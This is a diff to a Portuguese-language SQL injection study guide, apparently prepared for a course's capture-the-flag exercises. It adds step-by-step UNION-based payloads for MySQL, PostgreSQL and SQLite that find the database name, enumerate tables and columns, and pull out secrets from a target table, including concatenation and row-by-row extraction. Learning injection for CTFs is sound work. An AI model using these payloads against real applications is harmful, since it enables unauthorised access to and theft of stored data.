@@ -205,16 +205,69 @@ O erro contém o valor porque `updatexml()` rejeita XML inválido e mostra-o.
 ```
 Ver qual letra aparece na página → essa coluna é a que mostra dados.
 
-**Passo 3 — Extrair dados:**
+**Passo 3 — Descobrir o nome da base de dados (útil em MySQL):**
 ```sql
--- Descobrir tabelas (SQLite)
+-- MySQL
+' UNION SELECT 1,database(),3,4 --
+
+-- PostgreSQL
+' UNION SELECT 1,current_database(),3,4 --
+
+-- SQLite (não tem nome de DB — é um ficheiro, salta este passo)
+```
+
+**Passo 4 — Enumerar tabelas:**
+```sql
+-- SQLite
 ' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table' --
 
--- Descobrir tabelas (MySQL)
-' UNION SELECT 1,table_name,3,4 FROM information_schema.tables --
+-- MySQL
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() --
 
--- Extrair dados da tabela alvo
+-- PostgreSQL
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='public' --
+```
+Anotar todos os nomes de tabela que aparecem. Nos CTFs do prof, a tabela-alvo costuma ser `vault`, `secrets`, `flags` ou `users`.
+
+**Passo 5 — Enumerar colunas da tabela-alvo:**
+```sql
+-- SQLite (o schema vem todo na coluna sql do sqlite_master)
+' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='vault' --
+-- Retorna algo como: CREATE TABLE vault (id INTEGER, secret TEXT)
+
+-- MySQL
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='vault' --
+
+-- PostgreSQL
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='vault' --
+```
+
+**Passo 6 — Extrair dados:**
+```sql
 ' UNION SELECT 1,secret,3,4 FROM vault --
+
+-- Se há várias colunas interessantes, concatenar:
+-- SQLite
+' UNION SELECT 1,id || ':' || secret,3,4 FROM vault --
+
+-- MySQL
+' UNION SELECT 1,CONCAT(id,':',secret),3,4 FROM vault --
+
+-- PostgreSQL
+' UNION SELECT 1,id || ':' || secret,3,4 FROM vault --
+
+-- Se há várias linhas, usar LIMIT/OFFSET:
+' UNION SELECT 1,secret,3,4 FROM vault LIMIT 1 OFFSET 0 --
+' UNION SELECT 1,secret,3,4 FROM vault LIMIT 1 OFFSET 1 --
+```
+
+**Passo 7 (opcional) — Extrair tudo com GROUP_CONCAT (MySQL) ou group_concat (SQLite):**
+```sql
+-- MySQL — todas as linhas numa só string
+' UNION SELECT 1,GROUP_CONCAT(secret SEPARATOR '|'),3,4 FROM vault --
+
+-- SQLite
+' UNION SELECT 1,group_concat(secret,'|'),3,4 FROM vault --
 ```
 
 ### D) Boolean-based blind
